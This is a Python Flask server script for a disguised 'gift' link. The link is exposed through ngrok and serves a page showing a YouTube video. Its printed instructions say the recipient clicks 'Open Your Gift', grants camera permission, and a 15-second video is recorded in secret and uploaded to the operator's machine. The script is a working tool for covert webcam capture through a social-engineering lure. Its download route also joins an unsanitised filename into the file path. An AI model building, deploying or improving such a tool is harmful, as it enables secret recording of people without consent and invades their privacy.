#!/usr/bin/env python3
"""
Gift Video Receiver Server - With YouTube Video Support
"""

import os
import sys
import time
import json
import subprocess
import threading
import urllib.request
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

# ============================================
# Configuration
# ============================================
UPLOAD_FOLDER = 'gift_videos'
PORT = 5000
HTML_FILE = 'youtube-gift.html'  # Changed to new HTML file

# ============================================
# Flask Application
# ============================================
app = Flask(__name__)
CORS(app)

received_videos = []

@app.route('/')
def index():
    """Serve the festival HTML page"""
    try:
        with open(HTML_FILE, 'r') as f:
            html_content = f.read()
        return html_content
    except FileNotFoundError:
        return f"<h1>Error: {HTML_FILE} not found!</h1><p>Make sure the HTML file is in the same directory.</p>", 404

@app.route('/upload', methods=['POST'])
def upload_video():
    """Receive and save the uploaded video"""
    try:
        if 'video' not in request.files:
            return jsonify({'error': 'No video file'}), 400
        
        video_file = request.files['video']
        if video_file.filename == '':
            return jsonify({'error': 'No filename'}), 400

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"gift_{timestamp}.webm"
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        video_file.save(filepath)
        
        video_info = {
            'filename': filename,
            'path': filepath,
            'timestamp': timestamp,
            'size': os.path.getsize(filepath)
        }
        received_videos.append(video_info)
        
        print(f"\n📹 Received video {len(received_videos)}")
        print(f"   📁 {filename}")
        print(f"   📊 {video_info['size']:,} bytes")
        
        # Auto-open the video
        try:
            if sys.platform == 'linux':
                subprocess.run(['xdg-open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif sys.platform == 'darwin':
                subprocess.run(['open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        
        return jsonify({'success': True, 'filename': filename}), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/videos', methods=['GET'])
def list_videos():
    """Return list of received videos"""
    return jsonify({'videos': received_videos})

@app.route('/download/<filename>', methods=['GET'])
def download_video(filename):
    """Download a specific video"""
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# ============================================
# Main Server Class
# ============================================
class GiftServer:
    def __init__(self):
        self.ngrok_process = None
        self.ngrok_url = None
        self.port = PORT
        self.running = True
        self.ngrok_ready = threading.Event()

    def setup_directories(self):
        """Create necessary directories"""
        Path(UPLOAD_FOLDER).mkdir(exist_ok=True)

    def check_html_file(self):
        """Check if HTML file exists"""
        if not os.path.exists(HTML_FILE):
            print(f"\n❌ Error: {HTML_FILE} not found!")
            print(f"📁 Make sure {HTML_FILE} is in the current directory")
            return False
        return True

    def check_ngrok(self):
        """Check if ngrok is installed"""
        try:
            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
            if result.returncode == 0:
                return True
        except FileNotFoundError:
            pass
        
        print("\n❌ ngrok is not installed or not in PATH!")
        print("📥 Install from: https://ngrok.com/download")
        print("🔑 Then authenticate: ngrok config add-authtoken YOUR_TOKEN")
        return False

    def monitor_ngrok(self):
        """Monitor ngrok and get the public URL"""
        try:
            time.sleep(3)
            for attempt in range(10):
                try:
                    with urllib.request.urlopen('http://localhost:4040/api/tunnels', timeout=2) as response:
                        data = json.loads(response.read().decode())
                        for tunnel in data.get('tunnels', []):
                            if tunnel.get('proto') == 'https':
                                self.ngrok_url = tunnel.get('public_url')
                                self.ngrok_ready.set()
                                return
                except Exception:
                    time.sleep(3)
        except Exception as e:
            print(f"❌ Error monitoring ngrok: {e}")

    def start_ngrok(self):
        """Start ngrok tunnel"""
        print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
        
        try:
            self.ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            
            monitor_thread = threading.Thread(target=self.monitor_ngrok)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            if self.ngrok_ready.wait(timeout=30):
                print(f"✅ Tunnel established!")
                return True
            else:
                print("⚠️ ngrok started but URL not found")
                print("📋 Check http://localhost:4040 for the URL")
                return False
                
        except Exception as e:
            print(f"❌ Failed to start ngrok: {e}")
            return False

    def start_flask(self):
        """Start the Flask server"""
        print(f"\n🔧 Starting server on port {self.port}...")
        
        def run_flask():
            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)
        print("✅ Server running")

    def generate_link(self):
        """Generate and display the shareable link"""
        print("\n" + "="*50)
        print("📤 SHARE THIS GIFT LINK:")
        print("="*50)
        print(f"\n🔗 {self.ngrok_url}")
        print("\n" + "="*50)
        print("\n📋 Instructions:")
        print("   1. Send the link above to anyone")
        print("   2. They see a YouTube video of YOUR choice")
        print("   3. They click 'Open Your Gift'")
        print("   4. They grant camera permission")
        print("   5. 15-second video auto-records (hidden)")
        print("   6. Video saves to your computer!")
        print("\n📌 The user can change the YouTube video")
        print("   by pasting any YouTube URL!")
        print("="*50)
        print("\n📋 Link printed above - copy it manually")
        print(f"📁 Videos will be saved in: {UPLOAD_FOLDER}/")

    def wait_for_videos(self):
        """Monitor for incoming videos"""
        print("\n🎁 Waiting for gifts... (Press Ctrl+C to stop)")
        print("-"*50)
        print("\n⏳ Waiting for first video...")
        
        try:
            last_count = 0
            while self.running:
                current_count = len(received_videos)
                
                if current_count > last_count:
                    print(f"\n📹 Received video {current_count}")
                    last_count = current_count
                    print(f"\n⏳ Waiting for next video...")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n👋 Shutting down...")

    def cleanup(self):
        """Clean up processes"""
        print("\n🧹 Cleaning up...")
        if self.ngrok_process:
            self.ngrok_process.terminate()
            try:
                self.ngrok_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.ngrok_process.kill()
        print("✅ Done!")

    def run(self):
        """Main execution flow"""
        try:
            self.setup_directories()
            
            if not self.check_html_file():
                return
            
            if not self.check_ngrok():
                return
            
            self.start_flask()
            if not self.start_ngrok():
                return
            
            self.generate_link()
            self.wait_for_videos()
            
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
        finally:
            self.cleanup()

# ============================================
# Entry Point
# ============================================
if __name__ == '__main__':
    server = GiftServer()
    server.run()